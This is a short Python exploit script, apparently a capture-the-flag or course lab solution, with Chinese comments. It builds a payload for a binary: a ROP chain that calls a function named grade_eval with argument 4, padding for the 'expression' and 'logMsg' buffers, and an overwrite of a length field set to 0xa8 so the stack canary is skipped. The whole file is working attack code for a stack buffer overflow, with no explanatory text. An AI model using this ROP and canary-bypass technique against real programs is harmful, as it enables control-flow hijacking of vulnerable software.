import sys
import struct

pop_rdi_addr = 0x4018a3
ret_addr = 0x4018a4
grade_eval_addr = 0x401677

# 1. 构造 ROP 链
rop_chain = struct.pack('<Q', pop_rdi_addr)
rop_chain += struct.pack('<Q', 4)
rop_chain += struct.pack('<Q', ret_addr)
rop_chain += struct.pack('<Q', grade_eval_addr)

# 2. 填充 expression 剩余的空间
payload = rop_chain + b"A" * (128 - len(rop_chain))

# 3. 填满 logMsg (128 字节)
payload += b"B" * 128

# 4. 【关键修改】：覆盖 f.len 的值为 0xa8，跨过 Canary
payload += struct.pack('<I', 0xa8)

# 5. 加上换行符
payload += b'\n'

sys.stdout.buffer.write(payload)
